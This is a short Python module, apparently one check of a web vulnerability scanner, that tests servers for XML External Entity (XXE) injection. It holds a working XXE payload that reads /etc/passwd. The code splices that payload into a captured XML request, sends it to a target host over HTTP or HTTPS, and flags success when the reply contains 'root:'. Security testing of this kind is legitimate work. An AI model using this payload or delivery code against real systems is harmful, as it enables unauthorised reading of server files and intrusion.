from main import get_reply_from_host, rep

payload = '\n<!DOCTYPE foo [\n<!ELEMENT foo ANY >\n<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>\n<foo>&xxe;</foo>\n'


def add_payload_to_request(req):
    request_with_payload = ""
    index = req.find('<?xml version="1.0" encoding="UTF-8"?>')
    if index >= 0:
        request_with_payload = req[:index + 38] + payload + req[index + 38:]
    return request_with_payload


def scan_request(req, host, tls):
    request_with_payload = add_payload_to_request(req)
    if request_with_payload == "":
        return False
    if tls == 1:
        reply_bytes = get_reply_from_host(request_with_payload, host, 443, 1)
    else:
        reply_bytes = get_reply_from_host(request_with_payload, host, 80, 0)

    rep.insert_request(request_with_payload, host, tls)
    reply = reply_bytes.decode()

    return reply.find('root:') >= 0
